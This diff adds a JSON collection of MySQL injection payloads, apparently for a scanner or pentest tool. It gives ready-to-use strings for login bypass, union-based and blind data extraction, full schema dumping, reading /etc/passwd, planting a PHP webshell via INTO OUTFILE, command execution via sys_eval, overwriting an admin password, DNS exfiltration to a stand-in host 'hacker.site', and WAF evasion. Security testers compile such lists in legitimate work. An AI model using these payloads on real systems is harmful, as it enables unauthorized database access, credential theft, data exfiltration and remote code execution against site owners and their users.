@@ -1,0 +1,216 @@
+{
+  "category": "MySQL Injection",
+  "keyword": "mysql",
+  "payloads": [
+    {
+      "type": "Default Databases",
+      "tech": ["information_gathering"],
+      "payload": "mysql",
+      "description": "Requires root privileges"
+    },
+    {
+      "type": "Default Databases",
+      "tech": ["information_gathering"],
+      "payload": "information_schema",
+      "description": "Available from MySQL version 5 and higher"
+    },
+    {
+      "type": "Comments",
+      "tech": ["syntax"],
+      "payload": "#",
+      "description": "Hash comment"
+    },
+    {
+      "type": "Comments",
+      "tech": ["syntax"],
+      "payload": "/* MYSQL Comment */",
+      "description": "C-style comment"
+    },
+    {
+      "type": "Comments",
+      "tech": ["syntax"],
+      "payload": "/*! MYSQL Special SQL */",
+      "description": "Special SQL"
+    },
+    {
+      "type": "Comments",
+      "tech": ["syntax"],
+      "payload": "--",
+      "description": "SQL comment"
+    },
+    {
+      "type": "Comments",
+      "tech": ["syntax"],
+      "payload": ";%00",
+      "description": "Nullbyte"
+    },
+    {
+      "type": "Testing Injection - Strings",
+      "tech": ["testing"],
+      "payload": "'",
+      "description": "False"
+    },
+    {
+      "type": "Testing Injection - Strings",
+      "tech": ["testing"],
+      "payload": "''",
+      "description": "True"
+    },
+    {
+      "type": "Testing Injection - Numeric",
+      "tech": ["testing"],
+      "payload": "AND 1",
+      "description": "True"
+    },
+    {
+      "type": "Testing Injection - Numeric",
+      "tech": ["testing"],
+      "payload": "1*56",
+      "description": "Returns 56 if vulnerable"
+    },
+    {
+      "type": "Testing Injection - Login",
+      "tech": ["authentication_bypass"],
+      "payload": "' OR '1",
+      "description": "Login bypass"
+    },
+    {
+      "type": "Union Based - Column Detection",
+      "tech": ["union_based"],
+      "payload": "UNION SELECT NULL;--",
+      "description": "Iterative NULL method"
+    },
+    {
+      "type": "Union Based - Column Detection",
+      "tech": ["union_based"],
+      "payload": "ORDER BY 1--+",
+      "description": "ORDER BY method (True if column exists)"
+    },
+    {
+      "type": "Union Based - Column Detection",
+      "tech": ["union_based"],
+      "payload": "1' LIMIT 1,1 INTO @,@,@--+",
+      "description": "LIMIT INTO method (no error means 3 columns)"
+    },
+    {
+      "type": "Union Based - Data Extraction",
+      "tech": ["union_based", "data_exfiltration"],
+      "payload": "UNION SELECT 1,2,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER",
+      "description": "Extract table names"
+    },
+    {
+      "type": "Union Based - Data Extraction",
+      "tech": ["union_based", "data_exfiltration"],
+      "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...",
+      "description": "Extract column names"
+    },
+    {
+      "type": "Error Based",
+      "tech": ["error_based"],
+      "payload": "AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -",
+      "description": "GTID_SUBSET method"
+    },
+    {
+      "type": "Error Based",
+      "tech": ["error_based"],
+      "payload": "AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-",
+      "description": "UPDATEXML function"
+    },
+    {
+      "type": "Blind Injection",
+      "tech": ["blind"],
+      "payload": "AND ASCII(LOWER(SUBSTR(version(),1,1)))=51",
+      "description": "Substring equivalent"
+    },
+    {
+      "type": "Blind Injection",
+      "tech": ["blind", "time_delay"],
+      "payload": "2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
+      "description": "Conditional time delay"
+    },
+    {
+      "type": "Blind Injection",
+      "tech": ["blind"],
+      "payload": "' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --",
+      "description": "REGEXP length check"
+    },
+    {
+      "type": "Time Based",
+      "tech": ["time_based"],
+      "payload": "AND BENCHMARK(40000000,SHA1(1337))",
+      "description": "BENCHMARK delay"
+    },
+    {
+      "type": "Time Based",
+      "tech": ["time_based"],
+      "payload": "AND SLEEP(10)=0",
+      "description": "SLEEP function"
+    },
+    {
+      "type": "DIOS",
+      "tech": ["data_dumping"],
+      "payload": "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#",
+      "description": "Dump all schema/table/column info"
+    },
+    {
+      "type": "Process Monitoring",
+      "tech": ["monitoring"],
+      "payload": "UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",
+      "description": "Show current queries"
+    },
+    {
+      "type": "File Read",
+      "tech": ["file_read"],
+      "payload": "UNION ALL SELECT LOAD_FILE('/etc/passwd') --",
+      "description": "Read local file"
+    },
+    {
+      "type": "Command Execution",
+      "tech": ["command_execution"],
+      "payload": "UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"",
+      "description": "Webshell via OUTFILE"
+    },
+    {
+      "type": "Command Execution",
+      "tech": ["command_execution"],
+      "payload": "SELECT sys_eval('id');",
+      "description": "UDF command execution"
+    },
+    {
+      "type": "Insert Injection",
+      "tech": ["data_manipulation"],
+      "payload": "attacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" --",
+      "description": "Admin password reset"
+    },
+    {
+      "type": "Truncation Attack",
+      "tech": ["authentication_bypass"],
+      "payload": "admin               a",
+      "description": "Bypass length limits"
+    },
+    {
+      "type": "Out of Band",
+      "tech": ["oob_exfiltration"],
+      "payload": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.hacker.site\\\\a.txt'));",
+      "description": "DNS exfiltration"
+    },
+    {
+      "type": "WAF Bypass",
+      "tech": ["waf_bypass"],
+      "payload": "SELECT * FROM mysql.innodb_table_stats;",
+      "description": "Alternative to information_schema"
+    },
+    {
+      "type": "WAF Bypass",
+      "tech": ["waf_bypass"],
+      "payload": "1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2",
+      "description": "Scientific notation obfuscation"
+    },
+    {
+      "type": "Wide Byte Injection",
+      "tech": ["waf_bypass", "charset_attack"],
+      "payload": "%bf' OR 1=1 -- --",
+      "description": "GBK encoding bypass"
+    }
+  ]
+}
